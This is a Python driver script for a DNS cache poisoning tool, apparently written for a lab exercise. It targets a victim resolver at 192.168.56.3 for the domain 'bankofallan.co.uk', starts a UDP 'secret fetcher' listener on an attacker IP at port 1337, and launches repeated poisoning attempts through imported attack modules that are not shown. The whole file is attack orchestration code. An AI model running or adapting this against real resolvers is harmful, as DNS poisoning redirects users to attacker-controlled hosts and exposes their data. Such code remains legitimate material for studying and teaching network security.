#! /usr/bin/env python3
    
## @package Main
#   This package is responsible to execute all the passage required for the attack
#
import dns.resolver
from dns.resolver import NoAnswer

import multiprocessing
import random #For generating random ID

import time
import socket
import sys
import signal

from blessings import Terminal #For terminal threading

from multiprocessing.pool import ThreadPool
import logging
import threading
from threading import Thread

from dns_poisoning import DNSPoisoning
from dns_attack import DNSAttack

#Globals
secret_fetch_flag = True        #Used to stop the secret fetcher
verbosity = 1
term = Terminal()


## Logging function
#
#   @brief The fuction used for output messages
#   @param msg The message to display
#
def log(msg):
    if verbosity > 0:
        print(msg.format(t=term))
        

def sigint_handler(sig, frame):
    log("Stopping secret fetcher thread...")
    secret_fetch_flag = False
    time.sleep(1)
    print("Exiting...")
    sys.exit(0)

def secret_fetcher(server_ip, server_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
    sock.bind((server_ip, server_port))

    print("({t.bold}secret fetcher{t.normal}) Listening on {IP}:{port} for incoming message...".format(t=term, IP=server_ip, port=server_port))

    while secret_fetch_flag:
        data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
        print("({t.bold}secret fetcher{t.normal})Received response:{msg}".format(msg=data, t=term))
    

def main():
    
    print("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n".format(t=term))

    victim_server_ip = '192.168.56.3'
    domain = 'bankofallan.co.uk'
    #Bad Guy
    bad_udp_port = 55553
    bad_udp_ip = '192.168.56.1'


    #Launch the secret fetcher
    secret_thread = Thread(target=secret_fetcher, args = (bad_udp_ip, 1337))
    secret_thread.start()

    attack = DNSAttack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, \
            blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)

    attack.start(number_of_tries=50)




main()